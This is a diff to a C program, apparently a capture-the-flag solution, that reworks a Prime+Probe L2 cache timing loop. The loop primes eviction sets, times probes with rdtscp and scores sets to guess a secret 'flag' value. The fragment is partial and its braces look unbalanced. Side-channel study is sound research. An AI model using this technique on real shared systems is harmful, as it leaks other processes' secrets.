@@ -84,22 +84,16 @@ int main() {
 
         uint64_t scores[NUM_L2_CACHE_SETS] = {0};
 
-        
-
-        
-        int best_set = 0;
-        uint64_t best_score = 0;
-
-        for(int set = 0; set < NUM_L2_CACHE_SETS; set++) {
-            for(int r = 0; r < REPEATS; r++) {
+        for(int r = 0; r < REPEATS; r++) {
 
             int perm[NUM_L2_CACHE_SETS];
+
             for(int i = 0; i < NUM_L2_CACHE_SETS; i++)
                 perm[i] = i;
 
             shuffle(perm);
 
-            /* PRIME ALL SETS */
+            /* PRIME all sets */
 
             for(int i = 0; i < NUM_L2_CACHE_SETS; i++) {
 
@@ -113,12 +107,11 @@ int main() {
 
             wait_cycles(8000);
 
-            /* PROBE ALL SETS */
+            /* PROBE all sets */
 
             for(int i = 0; i < NUM_L2_CACHE_SETS; i++) {
 
                 int set = perm[i];
-
                 uint64_t total_time = 0;
 
                 for(int w = WAYS - 1; w >= 0; w--) {
@@ -127,20 +120,26 @@ int main() {
                     tmp ^= *eviction_sets[set][w];
                     uint64_t end = rdtscp();
 
-                    total_time += (end - start);
+                    total_time += end - start;
                 }
 
-                if(total_time >= MIN_CYCLES && total_time <= MAX_CYCLES)
+                 if(total_time >= MIN_CYCLES && total_time <= MAX_CYCLES)
                     scores[set]++;
+                }
             }
-        }
 
-            if(scores[set] > best_score) {
-                best_score = scores[set];
-                best_set = set;
-            }   
-        }
+            /* pick best set */
 
+            int best_set = 0;
+            uint64_t best_score = 0;
+
+            for(int set = 0; set < NUM_L2_CACHE_SETS; set++) {
+
+                if(scores[set] > best_score) {
+                    best_score = scores[set];
+                    best_set = set;
+                }
+            }
         printf("Guessed flag: %d (hits=%lu)\n", best_set, best_score);
 
         wait_cycles(2000);
